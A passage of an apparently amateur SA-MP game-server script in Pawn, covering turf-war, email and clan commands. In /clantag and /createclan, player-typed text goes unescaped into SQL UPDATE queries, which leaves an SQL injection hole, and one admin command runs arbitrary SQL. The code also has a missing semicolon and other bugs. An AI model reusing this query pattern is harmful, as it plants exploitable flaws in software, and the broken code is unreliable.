    entx = -42.693019;
    enty = 1406.028686;
    entz = 1084.429687;
    inth = 8;
    }
    if(numehouse == 24)
    {
    entx = 2285.795166;
    enty = -1137.499755;
    entz = 1050.898437;
    inth = 11;
    }
    if(numehouse == 25)
    {
    entx = 83.098403;
    enty = 1322.736083;
    entz = 1083.866210;
    inth = 9;
    }
    if(numehouse == 26)
    {
    entx = 260.850860;
    enty = 1238.124633;
    entz = 1084.257812;
    inth = 9;
    }
    if(numehouse == 27)
    {
    entx = 225.625717;
    enty = 1022.504638;
    entz = 1084.014648;
    inth = 7;
    }
    SetPlayerPosEx(playerid,entx,enty,entz);
    SetPlayerInterior(playerid,inth);
    return 1;
    }

    if(!strcmp(cmd,"/changeemail",true))
    {
    new email[150];
    email = strtok(cmdtext,idx);
    if(!strlen(email)) return SCM(playerid,COL_SYN,"Syntax: /changeemail <NewAddres>");
    if(strlen(email) >= 128) return SCM(playerid,COL_SYN,"Invalid Email.");
    new aCount2,dotCount2,atCount2,numCount2;//by eblis
            for(new i = 0; i < strlen(email); i++)
            {
            switch(email[i])
            {
                case 0x30..0x39: numCount2++;
                case 0x41..0x5A: aCount2++;
                case 0x61..0x7A: aCount2++;
                case '.': dotCount2++;
                case '@': atCount2++;
                case ' ': return SCM(playerid,COLOR_ALI,"Invalid Email.");
                case ' ': return SCM(playerid,COLOR_ALI,"Invalid Email.");
                case '\'': return SCM(playerid,COLOR_ALI,"Invalid Email.");
                case '\"': return SCM(playerid,COLOR_ALI,"Invalid Email.");
            }
   }
          if((numCount2 >= 1 || aCount2 >= 1) && (dotCount2 >= 1 && atCount2 == 1) && strlen(email) >= 5)
          {
          new strs[200];
          mysql_escape_string(email, strs, handle, 200);
          strmid(PlayerInfo[playerid][pEmail],strs,0,strlen(strs),128);
          SaveKonStr(playerid, "pEmail", strs);
          //SaveAccount(playerid);
          new sttr[150];
          format(sttr,150,"Your email address changed to %s",strs);
          SCM(playerid,COLOR_ALI,sttr);
          }
          else
          {
          SCM(playerid,COLOR_ALI,"Invalid Email.");
          }
          return 1;
          }
		if(!strcmp(cmd,"/warscore",true))
		{
		    if(ServerTurf == 9999) return SCM(playerid, COLOR_YELLOW2, "There is no war on any turf.");
			SendClientMessage(playerid, CRISTIAN,"_______________________________________________________");
			new faname[128],faname2[128],strlol[512];
		    if(TurfAttacker[ServerTurf] == 5) { faname = "{5D7E8D}Silence Mafia{FFFFFF}"; }
		    else if(TurfAttacker[ServerTurf] == 6) { faname = "{3E3535}The Killers Family{FFFFFF}"; }
		    else if(TurfAttacker[ServerTurf] == 12) { faname = "{19AF23}Dangerous Tigers Family{FFFFFF}"; }
		    else if(TurfAttacker[ServerTurf] == 13) { faname = "{FFBA00}Legendary Men Family{FFFFFF}"; }
		    else if(TurfAttacker[ServerTurf] == 14) { faname = "{B32CF6}Fast N Furious Family{FFFFFF}"; }
		    else if(TurfAttacker[ServerTurf] == 15) { faname = "{00ECEC}Storm Men Family{FFFFFF}"; }
		    else if(TurfAttacker[ServerTurf] == 19) { faname = "{0E47FF}The Racers{FFFFFF}"; }
			format(strlol,sizeof(strlol),"* Attacker: %s: {00FFFF}[Deaths: %i | Kills: %i | Score: %i]",faname,DeathsAttackerTurf[ServerTurf],KillsAttackerTurf[ServerTurf],KillsAttackerTurf[ServerTurf] - DeathsAttackerTurf[ServerTurf]);
			SCM(playerid,0xFFFFFFFF,strlol);
	        for(new i; i < MAX_PLAYERS; i++)
	        {
				new mem;
   			    if(PINFO[i][pLeader]) mem = PINFO[i][pLeader];
	    	    else mem = PINFO[i][pMember];
	            if(IsPlayerConnected(i))
	            {
	                if(mem == TurfAttacker[ServerTurf])
	                {
						format(strlol,sizeof(strlol),"{57e547}%s(%d): {00FFFF}[Deaths: %i | Kills: %i | Score: %i]",PlayerName(i),i,DeathsAttacker[i],KillsAttacker[i],KillsAttacker[i] - DeathsAttacker[i]);
						SCM(playerid,COLOR_JOB,strlol);
	                }
	            }
	        }
		    if(TurfKhod[ServerTurf] == 5) { faname2 = "{5D7E8D}Silence Mafia{FFFFFF}"; }
		    else if(TurfKhod[ServerTurf] == 6) { faname2 = "{3E3535}The Killers Family{FFFFFF}"; }
		    else if(TurfKhod[ServerTurf] == 12) { faname2 = "{19AF23}Dangerous Tigers Family{FFFFFF}"; }
		    else if(TurfKhod[ServerTurf] == 13) { faname2 = "{FFBA00}Legendary Men Family{FFFFFF}"; }
		    else if(TurfKhod[ServerTurf] == 14) { faname2 = "{B32CF6}Fast N Furious Family{FFFFFF}"; }
		    else if(TurfKhod[ServerTurf] == 15) { faname2 = "{00ECEC}Storm Men Family{FFFFFF}"; }
		    else if(TurfKhod[ServerTurf] == 19) { faname2 = "{0E47FF}The Racers{FFFFFF}"; }
			SCM(playerid,0xFFFFFFFF,"");
			format(strlol,sizeof(strlol),"* Turf Owner: %s: {00FFFF}[Deaths: %i | Kills: %i | Score: %i]",faname2,DeathsKhodTurf[ServerTurf],KillsKhodTurf[ServerTurf],KillsKhodTurf[ServerTurf] - DeathsKhodTurf[ServerTurf]);
			SCM(playerid,0xFFFFFFFF,strlol);
	        for(new i; i < MAX_PLAYERS; i++)
	        {
				new mem;
   			    if(PINFO[i][pLeader]) mem = PINFO[i][pLeader];
	    	    else mem = PINFO[i][pMember];
	            if(IsPlayerConnected(i))
	            {
	                if(mem == TurfKhod[ServerTurf])
	                {
						format(strlol,sizeof(strlol),"{57e547}%s(%d): {00FFFF}[Deaths: %i | Kills: %i | Score: %i]",PlayerName(i),i,DeathsKhod[i],KillsKhod[i],KillsKhod[i] - DeathsKhod[i]);
						SCM(playerid,COLOR_JOB,strlol);
	                }
	            }
	        }
			format(strlol,sizeof(strlol),"%02d:%02d",TurfTime[ServerTurf]/60,TurfTime[ServerTurf]-(floatround(TurfTime[ServerTurf]/60)*60));
			SCM(playerid,COLOR_JOB,strlol);
			SendClientMessage(playerid, CRISTIAN,"_______________________________________________________");
			return 1;
		}
		if(!strcmp(cmd,"/wartime",true))
		{
			if(!IsAMemberC(playerid)) return SCM(playerid,COLOR_ALI,"You are not in a family");
			if(OnWar[playerid] == 9999) return SCM(playerid,COLOR_ALI,"You are not on war.");
			new strlol[512],mem;
			if(PINFO[playerid][pLeader] != 0) mem = PINFO[playerid][pLeader];
			else mem = PINFO[playerid][pMember];
		    if(mem == TurfAttacker[ServerTurf])
		    {
		        format(strlol,sizeof(strlol),"[Turfs]: Times Deaths: %i,Times Kills: %i, score: %i | %02d:%02d",DeathsAttacker[playerid],KillsAttacker[playerid],KillsAttacker[playerid] - DeathsAttacker[playerid],TurfTime[ServerTurf]/60,TurfTime[ServerTurf]-(floatround(TurfTime[ServerTurf]/60)*60));
		        SCM(playerid,COLOR_JOB,strlol);
		    }
		    if(mem == TurfKhod[ServerTurf])
		    {
		        format(strlol,512,"[Turfs]: Times Deaths: %i,Times Kills: %i, score: %i | %02d:%02d",DeathsKhod[playerid],KillsKhod[playerid],KillsKhod[playerid] - DeathsKhod[playerid],TurfTime[ServerTurf]/60,TurfTime[ServerTurf]-(floatround(TurfTime[ServerTurf]/60)*60));
		        SCM(playerid,COLOR_JOB,strlol);
		    }
			return 1;
		}
	if(!strcmp(cmd,"/attack",true))
	{
		if(!IsAMemberC(playerid)) return SCM(playerid,COLOR_ALI,"Shoma Faction/Family Nadarid.");
		if(PlayerInfo[playerid][pRank] <= 3) return SCM(playerid,COLOR_ALI,"Baiad Rank +4 Bashid.");
	    if(ServerTurf != 9999)  return SCM(playerid,COLOR_ALI,"Dar Hale Hazer Yek Turf Dar Hale Attack Mibashad.");
		new famil;
		if(PlayerInfo[playerid][pLeader]) famil = PlayerInfo[playerid][pLeader];
		else famil = PlayerInfo[playerid][pMember];
		if(DynamicFactions[famil-1][fBank] < 2000) return SCM(playerid,COLOR_ALI,"You haven't 2,000$ in your HQ to attack");
		if(OnWar[playerid] != 9999) return SCM(playerid,COLOR_ALI,"You already attacked/Defending a turf.");
		new turf = GetPlayerZone(playerid);
		if(turf == -1) return SCM(playerid,COLOR_ALI,"Shoma Dar Turf Nistid.");
		if(!strcmp(TurfInfo[turf][zOwner],"SilenceMafia",true) && (PINFO[playerid][pMember] == 5 || PINFO[playerid][pLeader] == 5)) return SCM(playerid,COLOR_ALI,"You cannot attack your turf.");
		if(!strcmp(TurfInfo[turf][zOwner],"TheKillers",true) && (PINFO[playerid][pMember] == 6 || PINFO[playerid][pLeader] == 6)) return SCM(playerid,COLOR_ALI,"You cannot attack your turf.");
		if(!strcmp(TurfInfo[turf][zOwner],"DangerousTigers",true) && (PINFO[playerid][pMember] == 12 || PINFO[playerid][pLeader] == 12)) return SCM(playerid,COLOR_ALI,"You cannot attack your turf.");
		if(!strcmp(TurfInfo[turf][zOwner],"LegendaryMen",true) && (PINFO[playerid][pMember] == 13 || PINFO[playerid][pLeader] == 13)) return SCM(playerid,COLOR_ALI,"You cannot attack your turf.");
		if(!strcmp(TurfInfo[turf][zOwner],"FNF",true) && (PINFO[playerid][pMember] == 14 || PINFO[playerid][pLeader] == 14)) return SCM(playerid,COLOR_ALI,"You cannot attack your turf.");
		if(!strcmp(TurfInfo[turf][zOwner],"StormMen",true) && (PINFO[playerid][pMember] == 15 || PINFO[playerid][pLeader] == 15)) return SCM(playerid,COLOR_ALI,"You cannot attack your turf.");
		if(TurfAttacker[turf] != 9999) return SCM(playerid,COLOR_ALI,"This turf already on attack.");
		new turfmembers,rang,familyname[256];
		if(PINFO[playerid][pMember] == 5 || PINFO[playerid][pLeader] == 5)
		{
			new string[256];
			format(string,256,"%s","SilenceMafia");
			strmid(familyname,string,0,strlen(string),256);
		}
		if(PINFO[playerid][pMember] == 6 || PINFO[playerid][pLeader] == 6)
		{
			new string[256];
			format(string,256,"%s","TheKillers");
			strmid(familyname,string,0,strlen(string),256);
		}
		if(PINFO[playerid][pMember] == 12 || PINFO[playerid][pLeader] == 12)
		{
			new string[256];
			format(string,256,"%s","DangerousTigers");
			strmid(familyname,string,0,strlen(string),256);
		}
		if(PINFO[playerid][pMember] == 13 || PINFO[playerid][pLeader] == 13)
		{
			new string[256];
			format(string,256,"%s","LegendaryMen");
			strmid(familyname,string,0,strlen(string),256);
		}
		if(PINFO[playerid][pMember] == 14 || PINFO[playerid][pLeader] == 14)
		{
			new string[256];
			format(string,256,"%s","FNF");
			strmid(familyname,string,0,strlen(string),256);
		}
		if(PINFO[playerid][pMember] == 15 || PINFO[playerid][pLeader] == 15)
		{
			new string[256];
			format(string,256,"%s","StormMen");
			strmid(familyname,string,0,strlen(string),256);
		}
		for(new i = 0;i<LastPID;i++)
		{
			if(PINFO[i][pMember] == 5 || PINFO[i][pLeader] == 5)
			{
				new string[256];
				format(string,256,"%s","SilenceMafia");
				strmid(familyname,string,0,strlen(string),256);
			}
			if(PINFO[i][pMember] == 6 || PINFO[i][pLeader] == 6)
			{
				new string[256];
				format(string,256,"%s","TheKillers");
				strmid(familyname,string,0,strlen(string),256);
			}
			if(PINFO[i][pMember] == 12 || PINFO[i][pLeader] == 12)
			{
				new string[256];
				format(string,256,"%s","DangerousTigers");
				strmid(familyname,string,0,strlen(string),256);
			}
			if(PINFO[i][pMember] == 13 || PINFO[i][pLeader] == 13)
			{
				new string[256];
				format(string,256,"%s","LegendaryMen");
				strmid(familyname,string,0,strlen(string),256);
			}
			if(PINFO[i][pMember] == 14 || PINFO[i][pLeader] == 14)
			{
				new string[256];
				format(string,256,"%s","FNF");
				strmid(familyname,string,0,strlen(string),256);
			}
			if(PINFO[i][pMember] == 15 || PINFO[i][pLeader] == 15)
			{
				new string[256];
				format(string,256,"%s","StormMen");
				strmid(familyname,string,0,strlen(string),256);
			}
		}
		if(famil == 6) rang = 0x3E353588;
		if(famil == 5) rang = 0x5D7E8D88;
		if(famil == 12) rang = 0x19AF2388;
		if(famil == 13) rang = 0xFFBA0088;
		if(famil == 14) rang = 0x9900FF88;
		if(famil == 15) rang = 0x00ECEC88;
		if(famil == 19) rang = 0x0E47FF88;
		if(!strcmp(TurfInfo[turf][zOwner],"SilenceMafia",true)) turfmembers =5;
		else if(!strcmp(TurfInfo[turf][zOwner],"TheKillers",true)) turfmembers =6;
		else if(!strcmp(TurfInfo[turf][zOwner],"DangerousTigers",true)) turfmembers =12;
		else if(!strcmp(TurfInfo[turf][zOwner],"LegendaryMen",true)) turfmembers =13;
		else if(!strcmp(TurfInfo[turf][zOwner],"FNF",true)) turfmembers =14;
		else if(!strcmp(TurfInfo[turf][zOwner],"StormMen",true)) turfmembers =15;
		for(new i = 0;i<LastPID;i++)
		{
			if(PlayerInfo[i][pMember] == turfmembers || PlayerInfo[i][pLeader] == turfmembers)
			{
				GangZoneFlashForPlayer(i,Turfs[turf],rang);
				new stringg[512];
				format(stringg,512,"[Turfs]: Turfid %i Attacked By %s(%s) | Time Remaining: 30:00",turf,familyname,PlayerName(playerid));
				SCM(i,COLOR_JOB,stringg);
			    KillsAttacker[i] = 0;
				DeathsAttacker[i] = 0;
				KillsKhod[i] = 0;
				DeathsKhod[i] = 0;
				OnWar[i] = turf;
			}
			if(PlayerInfo[i][pMember] == famil || PlayerInfo[i][pLeader] == famil)
			{
				GangZoneFlashForPlayer(i,Turfs[turf],rang);
				new stringg[512];
				format(stringg,512,"[Turfs]: Your Family Attacked Turfid: %i(%s) By %s | Time Remaining: 30:00",turf,TurfInfo[turf][zOwner],PlayerName(playerid));
				SCM(i,COLOR_JOB,stringg);
				KillsAttacker[i] = 0;
				DeathsAttacker[i] = 0;
				KillsKhod[i] = 0;
				DeathsKhod[i] = 0;
				OnWar[i] = turf;
			}
		}
		ServerTurf =turf;
		ServerTurfRang =rang;
		TurfAttacker[turf] = famil;
		TurfKhod[turf] = turfmembers;
		KillsAttackerTurf[turf] = 0;
		DeathsAttackerTurf[turf] = 0;
		KillsKhodTurf[turf] = 0;
		DeathsKhodTurf[turf] = 0;
		ScoreAttacker[turf] = 0;
		ScoreKhod[turf] = 0;
		TurfTime[turf] = 1800;
		return 1;
	}





	if(!strcmp(cmd,"/turfs",true))
	{
		if(TurfShow[playerid] == 0)
		{
			TurfShow[playerid] = 1;
			SCM(playerid,COLOR_ALI,"All Turfs Showed On Your Map");
			GangZoneShowForPlayer(playerid,gID[0],0xFFFFFFFF);
			GangZoneShowForPlayer(playerid,gID[1],0xFFFFFFFF);
			GangZoneShowForPlayer(playerid,gID[2],0xFFFFFFFF);
			GangZoneShowForPlayer(playerid,gID[3],0xFFFFFFFF);
			GangZoneShowForPlayer(playerid,gID[4],0xFFFFFFFF);
			GangZoneShowForPlayer(playerid,gID[5],0xFFFFFFFF);
			GangZoneShowForPlayer(playerid,gID[6],0xFFFFFFFF);
			GangZoneShowForPlayer(playerid,gID[7],0xFFFFFFFF);
			GangZoneShowForPlayer(playerid,gID[8],0xFFFFFFFF);
			GangZoneShowForPlayer(playerid,gID[9],0xFFFFFFFF);
			GangZoneShowForPlayer(playerid,gID[10],0xFFFFFFFF);
			GangZoneShowForPlayer(playerid,gID[11],0xFFFFFFFF);
			GangZoneShowForPlayer(playerid,gID[12],0xFFFFFFFF);
			GangZoneShowForPlayer(playerid,gID[13],0xFFFFFFFF);
			for(new i = 0;i<sizeof(TurfInfo);i++)
		    {
			    if(!strcmp(TurfInfo[i][zOwner],"SilenceMafia",true)) GangZoneShowForPlayer(playerid,Turfs[i],0x5D7E8D88);
			    if(!strcmp(TurfInfo[i][zOwner],"TheKillers",true)) GangZoneShowForPlayer(playerid,Turfs[i],0x3E353588);
			    if(!strcmp(TurfInfo[i][zOwner],"StormMen",true)) GangZoneShowForPlayer(playerid,Turfs[i],0x00ECEC88);
			    if(!strcmp(TurfInfo[i][zOwner],"LegendaryMen",true)) GangZoneShowForPlayer(playerid,Turfs[i],0xFFBA0088);
			    if(!strcmp(TurfInfo[i][zOwner],"The Racers",true)) GangZoneShowForPlayer(playerid,Turfs[i],0x0E47FF88);
				if(!strcmp(TurfInfo[i][zOwner],"FNF",true)) GangZoneShowForPlayer(playerid,Turfs[i],0x9900FF88);
				if(!strcmp(TurfInfo[i][zOwner],"DangerousTigers",true)) GangZoneShowForPlayer(playerid,Turfs[i],0x19AF2388);
		    }
			if(ServerTurf != 9999) GangZoneFlashForPlayer(playerid,Turfs[ServerTurf],ServerTurfRang);
			return 1;
		}
		if(TurfShow[playerid] == 1)
		{
			TurfShow[playerid] = 0;
			SCM(playerid,COLOR_ALI,"All Turfs Hidded On Your Map");
			GangZoneHideForPlayer(playerid,gID[0]);
			GangZoneHideForPlayer(playerid,gID[1]);
			GangZoneHideForPlayer(playerid,gID[2]);
			GangZoneHideForPlayer(playerid,gID[3]);
			GangZoneHideForPlayer(playerid,gID[4]);
			GangZoneHideForPlayer(playerid,gID[5]);
			GangZoneHideForPlayer(playerid,gID[6]);
			GangZoneHideForPlayer(playerid,gID[7]);
			GangZoneHideForPlayer(playerid,gID[8]);
			GangZoneHideForPlayer(playerid,gID[9]);
			GangZoneHideForPlayer(playerid,gID[10]);
			GangZoneHideForPlayer(playerid,gID[11]);
			GangZoneHideForPlayer(playerid,gID[12]);
			GangZoneHideForPlayer(playerid,gID[13]);
		    for(new i = 0;i<sizeof(TurfInfo);i++)
		    {
			    GangZoneHideForPlayer(playerid,Turfs[i]);
		    }
	    }
	    return 1;
	}
    new string[256];
    if(!strcmp(cmd,"/onlinesqlquery",true))
    {
    if(PlayerInfo[playerid][pAdmin] <= 6) return 0;
    new query[512];
    query = strtokEx(cmdtext,idx);
    if(!strlen(query)) return SCM(playerid,COL_SYN,"Syntax: /omq2012 <Query>");
    mysql_function_query(handle,query,false,"SendQuery","");
    SCM(playerid,COLOR_ROUZ,"< -- D O N E -- >");
    return 1;
    }
     if(!strcmp(cmd,"/clantag",true))
    {
    new tc[512];
    tc = strtokEx(cmdtext,idx);
    if(!strlen(tc)) return SCM(playerid,COL_SYN,"Syntax: /clantag [ClanTag]");
    new c = PlayerInfo[playerid][pClan];
    if(PlayerInfo[playerid][pClan] >= 9999) return SCM(playerid,COL_SYN,"Error: You Have Clan");
    if(PlayerInfo[playerid][pcRank] != 7) return SCM(playerid,-1,"Bayad Leader Clan Bashid");
    if(PlayerInfo[playerid][pGold] < 100) return SCM(playerid,COL_SYN,"Error: You Haven't Enough Gold (100)");
    PlayerInfo[playerid][pGold] -= 100;
    new query22[512];
    format(query22,sizeof(query22),"UPDATE `clans` SET cTag='%s' WHERE cSQLid=%d", tc,c);
    mysql_function_query(handle, query22, false, "SendQuery", "");
    LoadDynamicClans();
    OnDynamicClansLoad();
    SCM(playerid,-1,"Change Shod.");
    GivePlayerTag(playerid, DynamicClans[c][cTag]);
    return 1;
    }
    if(!strcmp(cmd,"/createclan",true))
    {

    new tc[512];
    tc = strtokEx(cmdtext,idx);
    if(!strlen(tc)) return SCM(playerid,COL_SYN,"Syntax: /createclan [ClanTag]");
    new c = PlayerInfo[playerid][pClan];
    if(PlayerInfo[playerid][pClan] != 0) return SCM(playerid,COL_SYN,"Error: You Have Clan");
    if(PlayerInfo[playerid][pGold] < 500) return SCM(playerid,COL_SYN,"Error: You Haven't Enough Gold (500)");
   
    if(DynamicClans[0][cSlots] == 0) {
    new query2[512];
    format(query2,sizeof(query2),"UPDATE `clans` SET cName='%s' WHERE cSQLid='0'", tc);
    mysql_function_query(handle, query2, false, "SendQuery", "");

    new query22[512];
    format(query22,sizeof(query22),"UPDATE `clans` SET cTag='%s' WHERE cSQLid='0'", tc);
    mysql_function_query(handle, query22, false, "SendQuery", "");

    new querys2[512];
    format(querys2,sizeof(querys2),"UPDATE `clans` SET cSlots='5' WHERE cSQLid='0'");
    mysql_function_query(handle, querys2, false, "SendQuery", "");

    SCM(playerid,COLOR_ROUZ,"Your Clan Created / ID 0");

	PlayerInfo[playerid][pClan] = 1;
	SaveKonVal(playerid, "pClan", 1);

	PlayerInfo[playerid][pcRank] = 7;
	SaveKonVal(playerid, "pcRank", 7);

	strmid(DynamicClans[0][cName], tc, 0, strlen(tc), 512);
	strmid(DynamicClans[0][cTag], tc, 0, strlen(tc), 512);
	DynamicClans[0][cSlot] = 0;
	DynamicClans[0][cSlots] = 5;
	SaveKonStrC(0, "cName", tc);
	SaveKonStrC(0, "cTag", tc);
	SaveKonValC(0, "cSlot", 0);
	SaveKonValC(0, "cSlots", 5);
     OnDynamicClansLoad();
	GetPlayerTag(playerid);
	GivePlayerTag(playerid, DynamicClans[c][cTag]);
	}

    else if(DynamicClans[1][cSlots] == 0) {
    new query3[512];
    format(query3,sizeof(query3),"UPDATE `clans` SET cName='%s' WHERE cSQLid='1'", tc);
    mysql_function_query(handle, query3, false, "SendQuery", "");

    new query222[512];
    format(query222,sizeof(query222),"UPDATE `clans` SET cTag='%s' WHERE cSQLid='1'", tc);
    mysql_function_query(handle, query222, false, "SendQuery", "");

    new querys3[512];
    format(querys3,sizeof(querys3),"UPDATE `clans` SET cSlots='5' WHERE cSQLid='1'");
    mysql_function_query(handle, querys3, false, "SendQuery", "");

    SCM(playerid,COLOR_ROUZ,"Your Clan Created / ID 1");

	PlayerInfo[playerid][pClan] = 2;
	SaveKonVal(playerid, "pClan", 2);

	PlayerInfo[playerid][pcRank] = 7;
	SaveKonVal(playerid, "pcRank", 7);

	strmid(DynamicClans[1][cName], tc, 0, strlen(tc), 512);
	strmid(DynamicClans[1][cTag], tc, 0, strlen(tc), 512);
	DynamicClans[1][cSlot] = 0;
	DynamicClans[1][cSlots] = 5;
	SaveKonStrC(1, "cName", tc);
	SaveKonStrC(1, "cTag", tc);
	SaveKonValC(1, "cSlot", 0);
	SaveKonValC(1, "cSlots", 5);

	GetPlayerTag(playerid);
	    OnDynamicClansLoad();
	GivePlayerTag(playerid, DynamicClans[c][cTag]);
	}

    else if(DynamicClans[2][cSlots] == 0) {
    new query4[512];
    format(query4,sizeof(query4),"UPDATE `clans` SET cName='%s' WHERE cSQLid='2'", tc);
    mysql_function_query(handle, query4, false, "SendQuery", "");

    new query2222[512];
    format(query2222,sizeof(query2222),"UPDATE `clans` SET cTag='%s' WHERE cSQLid='2'", tc);
    mysql_function_query(handle, query2222, false, "SendQuery", "");

    new querys4[512];
    format(querys4,sizeof(querys4),"UPDATE `clans` SET cSlots='5' WHERE cSQLid='2'");
    mysql_function_query(handle, querys4, false, "SendQuery", "");

    SCM(playerid,COLOR_ROUZ,"Your Clan Created / ID 2");

	PlayerInfo[playerid][pClan] = 3;
	SaveKonVal(playerid, "pClan", 3);

	PlayerInfo[playerid][pcRank] = 7;
	SaveKonVal(playerid, "pcRank", 7);

	strmid(DynamicClans[2][cName], tc, 0, strlen(tc), 512);
	strmid(DynamicClans[2][cTag], tc, 0, strlen(tc), 512);
	DynamicClans[2][cSlot] = 0;
	DynamicClans[2][cSlots] = 5;
	SaveKonStrC(2, "cName", tc);
	SaveKonStrC(2, "cTag", tc);
	SaveKonValC(2, "cSlot", 0);
	SaveKonValC(2, "cSlots", 5);
     OnDynamicClansLoad();
	GetPlayerTag(playerid);
	GivePlayerTag(playerid, DynamicClans[c][cTag]);
	}


    else if(DynamicClans[3][cSlots] == 0) {
    new query5[512];
    format(query5,sizeof(query5),"UPDATE `clans` SET cName='%s' WHERE cSQLid='3'", tc);
    mysql_function_query(handle, query5, false, "SendQuery", "");

    new query22222[512];
    format(query22222,sizeof(query22222),"UPDATE `clans` SET cTag='%s' WHERE cSQLid='3'", tc);
    mysql_function_query(handle, query22222, false, "SendQuery", "");

    new querys5[512];
    format(querys5,sizeof(querys5),"UPDATE `clans` SET cSlots='5' WHERE cSQLid='3'");
    mysql_function_query(handle, querys5, false, "SendQuery", "");

    SCM(playerid,COLOR_ROUZ,"Your Clan Created / ID 3");

	PlayerInfo[playerid][pClan] = 4;
	SaveKonVal(playerid, "pClan", 4);
	PlayerInfo[playerid][pcRank] = 7;
	SaveKonVal(playerid, "pcRank", 7);

	strmid(DynamicClans[3][cName], tc, 0, strlen(tc), 512);
	strmid(DynamicClans[3][cTag], tc, 0, strlen(tc), 512);
	DynamicClans[3][cSlot] = 0;
	DynamicClans[3][cSlots] = 5;
	SaveKonStrC(3, "cName", tc);
	SaveKonStrC(3, "cTag", tc);
	SaveKonValC(3, "cSlot", 0);
	SaveKonValC(3, "cSlots", 5);
     OnDynamicClansLoad();
	GetPlayerTag(playerid);
	GivePlayerTag(playerid, DynamicClans[c][cTag]);
	}

    else if(DynamicClans[4][cSlots] == 0) {
    new query6[512];
    format(query6,sizeof(query6),"UPDATE `clans` SET cName='%s' WHERE cSQLid='4'", tc);
    mysql_function_query(handle, query6, false, "SendQuery", "");

    new query222222[512];
    format(query222222,sizeof(query222222),"UPDATE `clans` SET cTag='%s' WHERE cSQLid='4'", tc);
    mysql_function_query(handle, query222222, false, "SendQuery", "");

    new querys6[512];
    format(querys6,sizeof(querys6),"UPDATE `clans` SET cSlots='5' WHERE cSQLid='4'");
    mysql_function_query(handle, querys6, false, "SendQuery", "");

    SCM(playerid,COLOR_ROUZ,"Your Clan Created / ID 4");

	PlayerInfo[playerid][pClan] = 5;
	SaveKonVal(playerid, "pClan", 5);
	PlayerInfo[playerid][pcRank] = 7;
	SaveKonVal(playerid, "pcRank", 7);

	strmid(DynamicClans[4][cName], tc, 0, strlen(tc), 512);
	strmid(DynamicClans[4][cTag], tc, 0, strlen(tc), 512);
	DynamicClans[4][cSlot] = 0;
	DynamicClans[4][cSlots] = 5;
	SaveKonStrC(4, "cName", tc);
	SaveKonStrC(4, "cTag", tc);
	SaveKonValC(4, "cSlot", 0);
	SaveKonValC(4, "cSlots", 5);

	GetPlayerTag(playerid);
	GivePlayerTag(playerid, DynamicClans[c][cTag]);
	}

    else if(DynamicClans[5][cSlots] == 0) {
    new query7[512];
    format(query7,sizeof(query7),"UPDATE `clans` SET cName='%s' WHERE cSQLid='5'", tc);
    mysql_function_query(handle, query7, false, "SendQuery", "");

    new query2222222[512];
    format(query2222222,sizeof(query2222222),"UPDATE `clans` SET cTag='%s' WHERE cSQLid='5'", tc);
    mysql_function_query(handle, query2222222, false, "SendQuery", "");

    new querys7[512];
    format(querys7,sizeof(querys7),"UPDATE `clans` SET cSlots='5' WHERE cSQLid='5'");
    mysql_function_query(handle, querys7, false, "SendQuery", "");

    SCM(playerid,COLOR_ROUZ,"Your Clan Created / ID 5");

	PlayerInfo[playerid][pClan] = 6;
	SaveKonVal(playerid, "pClan", 6);
	PlayerInfo[playerid][pcRank] = 7;
	SaveKonVal(playerid, "pcRank", 7);

	strmid(DynamicClans[5][cName], tc, 0, strlen(tc), 512);
	strmid(DynamicClans[5][cTag], tc, 0, strlen(tc), 512);
	DynamicClans[5][cSlot] = 0;
	DynamicClans[5][cSlots] = 5;
	SaveKonStrC(5, "cName", tc);
	SaveKonStrC(5, "cTag", tc);
	SaveKonValC(5, "cSlot", 0);
	SaveKonValC(5, "cSlots", 5);
     OnDynamicClansLoad();
	GetPlayerTag(playerid);
	GivePlayerTag(playerid, DynamicClans[c][cTag]);
	}

    else if(DynamicClans[6][cSlots] == 0) {
    new query8[512];
    format(query8,sizeof(query8),"UPDATE `clans` SET cName='%s' WHERE cSQLid='6'", tc);
    mysql_function_query(handle, query8, false, "SendQuery", "");

    new query22222222[512];
    format(query22222222,sizeof(query22222222),"UPDATE `clans` SET cTag='%s' WHERE cSQLid='6'", tc);
    mysql_function_query(handle, query22222222, false, "SendQuery", "");

    new querys8[512];
    format(querys8,sizeof(querys8),"UPDATE `clans` SET cSlots='5' WHERE cSQLid='6'");
    mysql_function_query(handle, querys8, false, "SendQuery", "");

    SCM(playerid,COLOR_ROUZ,"Your Clan Created / ID 6");


	PlayerInfo[playerid][pClan] = 7;
	SaveKonVal(playerid, "pClan", 7);
	PlayerInfo[playerid][pcRank] = 7;
	SaveKonVal(playerid, "pcRank", 7);

	strmid(DynamicClans[6][cName], tc, 0, strlen(tc), 512);
	strmid(DynamicClans[6][cTag], tc, 0, strlen(tc), 512);
	DynamicClans[6][cSlot] = 0;
	DynamicClans[6][cSlots] = 5;
	SaveKonStrC(6, "cName", tc);
	SaveKonStrC(6, "cTag", tc);
	SaveKonValC(6, "cSlot", 0);
	SaveKonValC(6, "cSlots", 5);

	GetPlayerTag(playerid);
	GivePlayerTag(playerid, DynamicClans[c][cTag]);
	}

    else if(DynamicClans[7][cSlots] == 0) {
    new query9[512];
    format(query9,sizeof(query9),"UPDATE `clans` SET cName='%s' WHERE cSQLid='7'", tc);
    mysql_function_query(handle, query9, false, "SendQuery", "");

    new query222222222[512];
    format(query222222222,sizeof(query222222222),"UPDATE `clans` SET cTag='%s' WHERE cSQLid='7'", tc);
    mysql_function_query(handle, query222222222, false, "SendQuery", "");

    new querys9[512];
    format(querys9,sizeof(querys9),"UPDATE `clans` SET cSlots='5' WHERE cSQLid='7'");
    mysql_function_query(handle, querys9, false, "SendQuery", "");

    SCM(playerid,COLOR_ROUZ,"Your Clan Created / ID 7");

	PlayerInfo[playerid][pClan] = 8;
	SaveKonVal(playerid, "pClan", 8);
	PlayerInfo[playerid][pcRank] = 7;
	SaveKonVal(playerid, "pcRank", 7);

	strmid(DynamicClans[7][cName], tc, 0, strlen(tc), 512);
	strmid(DynamicClans[7][cTag], tc, 0, strlen(tc), 512);
	DynamicClans[7][cSlot] = 0;
	DynamicClans[7][cSlots] = 5
	SaveKonStrC(7, "cName", tc);
	SaveKonStrC(7, "cTag", tc);
	SaveKonValC(7, "cSlot", 0);
	SaveKonValC(7, "cSlots", 5);

	GetPlayerTag(playerid);
	GivePlayerTag(playerid, DynamicClans[c][cTag]);
	return 1;
	}
	else {SCM(playerid,COLOR_ROUZ,"CreateClan Is Closed. Please Speak With Founders");}
    return 1;
    }
    if(strcmp(cmd, "/cinfo", true) == 0)
    {
	if(IsPlayerConnected(playerid))
        {
